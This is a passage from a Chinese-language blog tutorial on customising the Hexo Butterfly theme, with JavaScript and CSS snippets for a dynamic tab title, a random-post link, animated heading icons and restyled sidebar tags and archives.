class="string">https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><h1 id="站点动态-title"><a href="#站点动态-title" class="headerlink" title="站点动态 title"></a>站点动态 title</h1><p>作者链接：<a href="https://anzhiy.cn/posts/sdxhu.html">https://anzhiy.cn/posts/sdxhu.html</a></p><details class="folding-tag" green><summary> 点击查看魔改站点动态 title 教程 </summary>              <div class='content'>              <p>添加自定义<code>title.js</code>，然后主题配置文件<code>inject</code>引入即可.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态标题</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OriginTitile</span> = <span class="variable language_">document</span>.<span class="property">title</span>;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;visibilitychange&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">hidden</span>) &#123;</span><br><span class="line">    <span class="comment">//离开当前页面时标签显示内容</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&quot;w(ﾟДﾟ)w 不要走！再看看嘛！&quot;</span>;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//返回当前页面时标签显示内容</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&quot;♪(^∇^*)欢迎肥来！&quot;</span> + <span class="title class_">OriginTitile</span>;</span><br><span class="line">    <span class="comment">//两秒后变回正常标题</span></span><br><span class="line">    titleTime = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">title</span> = <span class="title class_">OriginTitile</span>;</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>              </div>            </details><h1 id="random-js-随机跳转一篇文章"><a href="#random-js-随机跳转一篇文章" class="headerlink" title="random.js 随机跳转一篇文章"></a>random.js 随机跳转一篇文章</h1><details class="folding-tag" green><summary> random.js随机跳转一篇文章 </summary>              <div class='content'>              <p>目前博主已将该内容集成在<a href="https://www.npmjs.com/package/hexo-butterfly-swiper-anzhiyu">hexo-butterfly-swiper-anzhiyu</a>中, 如果你有安装该插件，那么你将无需魔改该内容即可在任意位置使用<code>toRandomPost()</code>方法来实现跳转随意一篇文章。</p><p>创建<code>themes/butterfly/scripts/helpers/random.js</code>文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">extend</span>.<span class="property">generator</span>.<span class="title function_">register</span>(<span class="string">&quot;random&quot;</span>, <span class="keyword">function</span> (<span class="params">locals</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> config = hexo.<span class="property">config</span>.<span class="property">random</span> || &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> posts = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> post <span class="keyword">of</span> locals.<span class="property">posts</span>.<span class="property">data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (post.<span class="property">random</span> !== <span class="literal">false</span>) posts.<span class="title function_">push</span>(post.<span class="property">path</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">path</span>: config.<span class="property">path</span> || <span class="string">&quot;zhheo/random.js&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: <span class="string">`var posts=<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(</span></span></span><br><span class="line"><span class="subst"><span class="string">      posts</span></span></span><br><span class="line"><span class="subst"><span class="string">    )&#125;</span>;function toRandomPost()&#123;pjax.loadUrl(&#x27;/&#x27;+posts[Math.floor(Math.random() * posts.length)]);&#125;;`</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果你没有开启<code>pjax</code>用下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">extend</span>.<span class="property">generator</span>.<span class="title function_">register</span>(<span class="string">&quot;random&quot;</span>, <span class="keyword">function</span> (<span class="params">locals</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> config = hexo.<span class="property">config</span>.<span class="property">random</span> || &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> posts = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> post <span class="keyword">of</span> locals.<span class="property">posts</span>.<span class="property">data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (post.<span class="property">random</span> !== <span class="literal">false</span>) posts.<span class="title function_">push</span>(post.<span class="property">path</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">path</span>: config.<span class="property">path</span> || <span class="string">&quot;anzhiyu/random.js&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: <span class="string">`var posts=<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(</span></span></span><br><span class="line"><span class="subst"><span class="string">      posts</span></span></span><br><span class="line"><span class="subst"><span class="string">    )&#125;</span>;function toRandomPost()&#123;window.open(&#x27;/&#x27;+posts[Math.floor(Math.random() * posts.length)],&quot;_self&quot;);&#125;;`</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在主题配置文件引入<code>themes/butterfly/_config.yml</code>，<code>inject</code>的<code>bottom</code>里添加</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;script</span> <span class="string">src=&quot;/anzhiyu/random.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>调用</strong><br>在需要调用的位置执行<code>toRandomPost()</code>函数即可。</p><p>比如任意<code>dom</code>添加<code>onclick=&quot;toRandomPost()&quot;</code></p>              </div>            </details><h1 id="文章页-H1-H6-图标风车样式效果"><a href="#文章页-H1-H6-图标风车样式效果" class="headerlink" title="文章页 H1-H6 图标风车样式效果"></a>文章页 H1-H6 图标风车样式效果</h1><div class="tabs" id="3"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#3-1">主题配置文件</button></li><li class="tab"><button type="button" data-href="#3-2">小风车转起来</button></li><li class="tab"><button type="button" data-href="#3-3">颜色大小修改</button></li><li class="tab"><button type="button" data-href="#3-4">hover效果</button></li><li class="tab"><button type="button" data-href="#3-5">hover效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="3-1"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">beautify:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># site/post</span></span><br><span class="line">  <span class="comment"># title-prefix-icon: &#x27;\f0c1&#x27; 原内容</span></span><br><span class="line">  <span class="attr">title-prefix-icon:</span> <span class="string">&#x27;\f863&#x27;</span></span><br><span class="line">  <span class="attr">title-prefix-icon-color:</span> <span class="string">&quot;#F47466&quot;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="3-2"><p>在上文的 blog/source/css/custom.css 文件中，加入以下代码即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文章页H1-H6图标样式效果 */</span></span><br><span class="line"><span class="selector-tag">h1</span><span class="selector-pseudo">::before</span>, <span class="selector-tag">h2</span><span class="selector-pseudo">::before</span>, <span class="selector-tag">h3</span><span class="selector-pseudo">::before</span>, <span class="selector-tag">h4</span><span class="selector-pseudo">::before</span>, <span class="selector-tag">h5</span><span class="selector-pseudo">::before</span>, <span class="selector-tag">h6</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: ccc <span class="number">1.6s</span> linear infinite ;</span><br><span class="line">  <span class="attribute">animation</span>: ccc <span class="number">1.6s</span> linear infinite ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">      -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">      -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">      -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">      -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>)</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="3-3"><p>本站使用了风车样式,添加以下 css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h1</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f07d35</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h2</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fb7061</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.35rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.1rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.12rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h3</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffbf00</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.22rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.95rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.09rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h4</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#a9e000</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.05rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.09rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h5</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#57c850</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">0.9rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.7rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0.0rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h6</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#5ec1e0</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">0.9rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.66rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0.0rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="3-4"><p>鼠标碰到小风车转速变慢及变色</p><p>设置鼠标碰到标题时，小风车跟随标题变色，且像是被光标阻碍了，转速变慢。</p><p>鼠标离开恢复转速。也可以设置为 none 鼠标碰到停止转动。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h1</span><span class="selector-pseudo">:hover</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h2</span><span class="selector-pseudo">:hover</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h3</span><span class="selector-pseudo">:hover</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h4</span><span class="selector-pseudo">:hover</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h5</span><span class="selector-pseudo">:hover</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h6</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#49b1f5</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h1</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h2</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h3</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h4</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h5</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>, <span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h6</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#49b1f5</span> ;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: ccc <span class="number">3.2s</span> linear infinite ;</span><br><span class="line">  <span class="attribute">animation</span>: ccc <span class="number">3.2s</span> linear infinite ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="3-5"><p>右下角设置 icon 转的太快了，让它慢一点吧。继续添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 页面设置icon转动速度调整 */</span></span><br><span class="line"><span class="selector-id">#rightside_config</span> <span class="selector-tag">i</span><span class="selector-class">.fas</span><span class="selector-class">.fa-cog</span><span class="selector-class">.fa-spin</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: fa-spin <span class="number">5s</span> linear infinite ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="侧边栏标签修改"><a href="#侧边栏标签修改" class="headerlink" title="侧边栏标签修改"></a>侧边栏标签修改</h1><p>作者链接：<a href="https://blog.leonus.cn/2022/tags.html">https://blog.leonus.cn/2022/tags.html</a></p><div class="tabs" id="4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#4-1">修改源码</button></li><li class="tab"><button type="button" data-href="#4-2">修改样式</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="4-1"><p>打开<code>butterfly\scripts\helpers\page.js</code>文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result += <span class="string">`&lt;a href=&quot;<span class="subst">$&#123;env.url_for(tag.path)&#125;</span>&quot; style=&quot;<span class="subst">$&#123;style&#125;</span>&quot;&gt;<span class="subst">$&#123;tag.name&#125;</span> (<span class="subst">$&#123;tag.length&#125;</span>)&lt;/a&gt;`</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="4-2"><p>打开我们的自定义css文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 标签 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-tag-cloud</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tag-cloud-list</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2rem</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="侧边栏归档修改"><a href="#侧边栏归档修改" class="headerlink" title="侧边栏归档修改"></a>侧边栏归档修改</h1><div class="tabs" id="5"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#5-1">修改样式</button></li><li class="tab"><button type="button" data-href="#5-2">自定义CSS</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="5-1"><p>打开<code>themes/butterfly/scripts/helpers/aside_archives.js</code>修改第 92 行左右, 其中 <sup> 表示上标，<sub> 表示下标。开启了排序。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result += transform ? transform(item.name) : item.name</span><br><span class="line">result += &#x27;&lt;/span&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if (showCount) &#123;</span><br><span class="line"><span class="deletion">- result += `&lt;span class=&quot;card-archive-list-count&quot;&gt;$&#123;item.count&#125;&lt;/span&gt;`</span></span><br><span class="line"><span class="addition">+ result += `&lt;div class=&quot;card-archive-list-count-group&quot;&gt;&lt;span class=&quot;card-archive-list-count&quot;&gt;$&#123;item.count&#125;&lt;/span&gt;&lt;span&gt;篇&lt;/span&gt;&lt;/div&gt;`</span></span><br><span class="line">&#125;</span><br><span class="line">result += &#x27;&lt;/a&gt;&#x27;</span><br><span class="line">result += &#x27;&lt;/li&gt;&#x27;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="5-2"><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 归档样式 */</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.card-archive-list-count</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.5rem</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">0.9</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.card-archive-list-count-group</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row;</span><br><span class="line">  <span class="attribute">align-items</span>: baseline;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span> &gt; <span class="selector-class">.card-archive-list-item</span> <span class="selector-tag">a</span> <span class="selector-tag">span</span><span class="selector-pseudo">:last-child</span>,</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &gt; <span class="selector-class">.card-category-list-item</span> <span class="selector-tag">a</span> <span class="selector-tag">span</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: fit-content;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.card-archive-list-count</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.1rem</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">0.9</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.card-archive-list-date</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.card-archive-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">48%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span> &gt; <span class="selector-class">.card-archive-list-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &gt; <span class="selector-class">.card-category-list-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: black;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-theme);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">0.5rem</span>;</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">0.5rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> 